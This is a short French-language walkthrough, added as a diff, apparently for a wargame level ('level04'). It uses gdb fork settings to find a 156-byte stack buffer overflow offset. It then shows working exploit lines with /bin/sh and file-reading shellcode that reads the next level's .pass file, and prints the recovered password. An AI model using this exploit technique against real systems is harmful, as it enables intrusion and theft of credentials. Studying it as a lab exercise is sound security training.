@@ -1,0 +1,34 @@
+on se rend compts que le programe utilise un fork on dois donc set les variable convenablement pour provoque le segfault et savoir l'offset
+
+set detach-on-fork off
+set follow-fork-mode child
+
++ un petit coup de buffer overflow generator
+et op 156
+
+(http://sourceware.org/gdb/onlinedocs/gdb/Forks.html)
+
+on sais donc ou et le buffer overflow on va pouvoir lancer un shell avec la variable d'env I
+
+export I=`python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+python -c "print 'A'*156 + '\xff\xff\xd8\xf1'[::-1]" | ./level04
+no exec() for you
+
+
+domage il le kill :/
+
+bien on va trouver un shellcode qui va cat en esperant aller asser vite avent de se fair kill
+
+http://shell-storm.org/shellcode/ -> file reader
+
+export J=`python -c "print '\x90'*200 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'"`
+
+python -c "print 'A'*156 + '\xFF\xFF\xD8\x1A'[::-1]" | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
+
+
+c'est GOOD
+
+
